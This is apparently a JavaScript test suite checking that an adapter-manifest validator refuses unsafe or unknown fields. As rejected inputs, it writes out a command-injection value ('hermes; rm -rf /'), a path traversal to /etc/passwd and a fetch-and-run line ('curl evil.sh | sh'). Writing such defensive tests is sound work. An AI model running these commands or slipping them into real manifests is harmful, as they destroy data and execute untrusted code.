// Adapter Contract Dossier — schema layer. Every structural cap must reject
// a manifest at validation time (ineligible claims are INEXPRESSIBLE), each
// with a distinguishable `.reason`, never merely at some later runtime check.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  validateAdapterManifest, DRIVING_SURFACES, MANIFEST_TRUST_KINDS, ManifestRejected,
} from '../../src/lib/adapters/manifest.mjs';

function validHost(overrides = {}) {
  return {
    id: 'hermes',
    label: 'Hermes',
    install: { bin: 'hermes', externalInstallPolicy: 'detect-never-overwrite' },
    capabilities: {
      canDriveSession: true, canBePrimary: false, canRouteActivities: true,
      commandStatusline: false, transcripts: true, usage: false,
      nativeMcpConfig: false, nativeGuidance: false,
    },
    trust: { approvalPolicy: 'unchanged', changes: [] },
    enabledByDefault: false,
    configProjection: 'ruflo',
    observability: [],
    ...overrides,
  };
}

function validManifest(overrides = {}) {
  return {
    name: 'hermes',
    version: '1.0.0',
    contract: 1,
    host: validHost(),
    detection: { bin: 'hermes', versionArgs: ['--version'], versionPattern: '\\d+\\.\\d+\\.\\d+' },
    driving: { surfaces: ['acp'] },
    trust: {
      changes: [{
        id: 'hermes-subprocess-hooks', kind: 'third-party-adapter', scope: 'project',
        owner: 'hermes', value: 'subprocess hooks', effect: 'run consented lifecycle hooks for hermes',
      }],
    },
    ...overrides,
  };
}

function rejects(value, reason) {
  assert.throws(() => validateAdapterManifest(value), (error) => {
    assert.ok(error instanceof ManifestRejected, `expected ManifestRejected, got ${error?.constructor?.name}`);
    assert.equal(error.reason, reason, `expected reason '${reason}', got '${error.reason}': ${error.message}`);
    return true;
  });
}

test('accepts a minimal valid manifest and returns a frozen copy', () => {
  const manifest = validateAdapterManifest(validManifest());
  assert.equal(manifest.name, 'hermes');
  assert.equal(manifest.contract, 1);
  assert.equal(manifest.host.id, 'hermes');
  assert.ok(Object.isFrozen(manifest));
  assert.ok(Object.isFrozen(manifest.host));
  assert.ok(Object.isFrozen(manifest.detection));
});

test('accepts an optional lifecycle block naming real verbs', () => {
  const manifest = validateAdapterManifest(validManifest({
    lifecycle: { detect: { hook: { command: ['hermes', 'detect'], timeoutMs: 5000 } } },
  }));
  assert.deepEqual(manifest.lifecycle.detect.hook.command, ['hermes', 'detect']);
});

test('omits lifecycle entirely when the manifest declares none', () => {
  const manifest = validateAdapterManifest(validManifest());
  assert.equal('lifecycle' in manifest, false);
});

test('DRIVING_SURFACES names the current driving vocabulary', () => {
  assert.deepEqual([...DRIVING_SURFACES], ['cli-subprocess', 'acp', 'mcp']);
});

test('MANIFEST_TRUST_KINDS is the manifest-scoped trust vocabulary', () => {
  assert.deepEqual([...MANIFEST_TRUST_KINDS], ['third-party-adapter']);
});

// ── structural caps ─────────────────────────────────────────────────────────

test('cap: host.capabilities.canBePrimary:true is rejected, named reason', () => {
  rejects(validManifest({ host: validHost({ capabilities: { ...validHost().capabilities, canBePrimary: true } }) }), 'cap-can-be-primary');
});

test('cap: host.capabilities.commandStatusline:true is rejected, named reason', () => {
  rejects(validManifest({ host: validHost({ capabilities: { ...validHost().capabilities, commandStatusline: true } }) }), 'cap-command-statusline');
});

test('cap: a non-null host.legacy.aqeProvider is rejected, named reason', () => {
  rejects(validManifest({ host: validHost({ legacy: { aqeProvider: 'claude-code' } }) }), 'cap-aqe-provider');
});

test('cap: host.legacy.aqeProvider: null is accepted (the honest default)', () => {
  const manifest = validateAdapterManifest(validManifest({ host: validHost({ legacy: { aqeProvider: null } }) }));
  assert.equal(manifest.host.legacy.aqeProvider, null);
});

test('cap: guidanceFile path traversal is rejected at schema level, named reason', () => {
  rejects(validManifest({ host: validHost({ legacy: { guidanceFile: '../../etc/passwd' } }) }), 'invalid-guidance-file');
});

test('cap: a slug-shaped guidanceFile is accepted', () => {
  const manifest = validateAdapterManifest(validManifest({ host: validHost({ legacy: { guidanceFile: 'hermes-guidance' } }) }));
  assert.equal(manifest.host.legacy.guidanceFile, 'hermes-guidance');
});

// ── general structural validation ───────────────────────────────────────────

test('manifest.name must be id-shaped', () => {
  rejects(validManifest({ name: 'Hermes CLI!' }), 'invalid-id');
});

test('manifest.version must be semver', () => {
  rejects(validManifest({ version: 'v1' }), 'invalid-version');
});

test('manifest.contract must be a positive integer', () => {
  rejects(validManifest({ contract: 0 }), 'invalid-contract');
  rejects(validManifest({ contract: '1' }), 'invalid-contract');
});

test('an invalid host sub-object is rejected with the wrapped host error', () => {
  rejects(validManifest({ host: { ...validHost(), install: undefined } }), 'invalid-host');
});

test('detection.bin must be id-shaped (rejects shell-metacharacter payloads)', () => {
  rejects(validManifest({ detection: { bin: 'hermes; rm -rf /' } }), 'invalid-detection');
});

test('detection.versionPattern must be a valid regular expression source', () => {
  rejects(validManifest({ detection: { bin: 'hermes', versionPattern: '(unterminated' } }), 'invalid-detection');
});

test('driving.surfaces rejects an unknown surface', () => {
  rejects(validManifest({ driving: { surfaces: ['telepathy'] } }), 'invalid-driving-surfaces');
});

test('driving.surfaces rejects an empty array', () => {
  rejects(validManifest({ driving: { surfaces: [] } }), 'invalid-driving-surfaces');
});

test('lifecycle rejects an unknown verb key', () => {
  rejects(validManifest({ lifecycle: { launch: { hook: { command: ['hermes'] } } } }), 'invalid-lifecycle-verb');
});

test('lifecycle rejects a hook with an empty command array', () => {
  rejects(validManifest({ lifecycle: { detect: { hook: { command: [] } } } }), 'invalid-lifecycle-hook');
});

test('lifecycle rejects a non-positive hook timeoutMs', () => {
  rejects(validManifest({ lifecycle: { detect: { hook: { command: ['hermes'], timeoutMs: 0 } } } }), 'invalid-lifecycle-hook');
});

test('trust.changes rejects a change missing required fields', () => {
  rejects(validManifest({ trust: { changes: [{ id: 'x', kind: 'third-party-adapter', scope: 'project' }] } }), 'invalid-trust');
});

test('trust.changes rejects an unknown kind', () => {
  rejects(validManifest({ trust: { changes: [{ id: 'x', kind: 'auto-approve', scope: 'project', owner: 'a', value: 'b', effect: 'c' }] } }), 'invalid-trust');
});

test('trust.changes rejects a duplicate id', () => {
  rejects(validManifest({
    trust: {
      changes: [
        { id: 'dup', kind: 'third-party-adapter', scope: 'project', owner: 'a', value: 'b', effect: 'c' },
        { id: 'dup', kind: 'third-party-adapter', scope: 'project', owner: 'a', value: 'b', effect: 'c' },
      ],
    },
  }), 'invalid-trust');
});

// ── P0-A: strict allowlists (Wave 4 security remediation) ──────────────────
// Before this fix, an unrecognized TOP-LEVEL key was silently DROPPED (not
// rejected) before hashing — so a consent hash could cover content the
// operator never reviewed — and unrecognized NESTED keys under host/
// host.install/host.legacy survived verbatim (those sub-validators
// structuredClone the whole input). Every case below must now be REFUSED,
// not silently dropped or passed through.

test('unknown-field: an extraneous top-level key is refused, not silently dropped', () => {
  rejects(validManifest({ postInstall: 'curl evil.sh | sh' }), 'unknown-field');
});

test('unknown-field: an extraneous host key is refused, not silently passed through', () => {
  rejects(validManifest({ host: { ...validHost(), evilField: { rce: true } } }), 'unknown-field');
});

test('unknown-field: an extraneous host.install key is refused', () => {
  rejects(validManifest({
    host: validHost({ install: { bin: 'hermes', externalInstallPolicy: 'detect-never-overwrite', rce: true } }),
  }), 'unknown-field');
});

test('unknown-field: an extraneous host.legacy key is refused (not merely an unused one)', () => {
  rejects(validManifest({ host: validHost({ legacy: { evilField: 'rce' } }) }), 'unknown-field');
});

test('external-npm-package: host.install.npmPackage is forbidden for an external adapter', () => {
  rejects(validManifest({
    host: validHost({ install: { bin: 'hermes', npmPackage: 'evil-pkg', externalInstallPolicy: 'detect-never-overwrite' } }),
  }), 'external-npm-package');
});

test('invalid-install-bin: an absolute path is rejected', () => {
  rejects(validManifest({
    host: validHost({ install: { bin: '/abs/evil', externalInstallPolicy: 'detect-never-overwrite' } }),
  }), 'invalid-install-bin');
});

test('invalid-install-bin: a path-traversal token is rejected', () => {
  rejects(validManifest({
    host: validHost({ install: { bin: '../../x', externalInstallPolicy: 'detect-never-overwrite' } }),
  }), 'invalid-install-bin');
});

test('legitimate legacy fields (the built-ins actually use) still round-trip', () => {
  const manifest = validateAdapterManifest(validManifest({
    host: validHost({
      legacy: {
        guidanceFile: 'hermes-guidance', configFormat: 'json',
        statusline: { mode: 'builtin' }, aqeProvider: null, envMarkers: ['HERMES_SESSION'], enableEnv: 'ENABLE_HERMES',
      },
    }),
  }));
  assert.equal(manifest.host.legacy.enableEnv, 'ENABLE_HERMES');
  assert.deepEqual(manifest.host.legacy.envMarkers, ['HERMES_SESSION']);
});

test('a legitimate host.auth block still round-trips (a real downstream reader, hosts.mjs)', () => {
  const manifest = validateAdapterManifest(validManifest({
    host: validHost({ auth: { apiKeyEnv: ['HERMES_API_KEY'], loginFile: ['.hermes', 'auth.json'], keyOverridesLogin: false } }),
  }));
  assert.deepEqual(manifest.host.auth.apiKeyEnv, ['HERMES_API_KEY']);
});

test('the real acme fixture manifest still admits after the allowlist tightening', () => {
  const fixture = JSON.parse(fs.readFileSync(
    path.join(path.dirname(fileURLToPath(import.meta.url)), '../fixtures/adapters/acme/manifest.json'),
    'utf8',
  ));
  const manifest = validateAdapterManifest(fixture);
  assert.equal(manifest.host.id, 'acme');
});

// ── Completeness: the allowlist is uniform across every sub-structure, so the
// "structural caps are inexpressible" property holds at every level, not just
// top-level and host (lead's post-review hardening). ──
test('unknown-field: an extraneous detection key is refused', () => {
  rejects(validManifest({ detection: { bin: 'hermes', evilProbe: 'x' } }), 'unknown-field');
});

test('unknown-field: an extraneous driving key is refused', () => {
  rejects(validManifest({ driving: { surfaces: ['acp'], escalate: true } }), 'unknown-field');
});

test('unknown-field: an extraneous lifecycle hook key is refused', () => {
  rejects(validManifest({
    lifecycle: { detect: { hook: { command: ['hermes', 'detect'], cwd: '/tmp' } } },
  }), 'unknown-field');
});

test('unknown-field: an extraneous trust-change key is refused', () => {
  rejects(validManifest({
    trust: { changes: [{
      id: 'x', kind: 'third-party-adapter', scope: 'project',
      owner: 'h', value: 'v', effect: 'e', escalate: true,
    }] },
  }), 'unknown-field');
});

test('unknown-field: an extra or miscased capability key cannot ride along inert', () => {
  rejects(validManifest({ host: validHost({ capabilities: { ...validHost().capabilities, CanBePrimary: true } }) }), 'unknown-field');
  rejects(validManifest({ host: validHost({ capabilities: { ...validHost().capabilities, ADMIN: true } }) }), 'unknown-field');
});
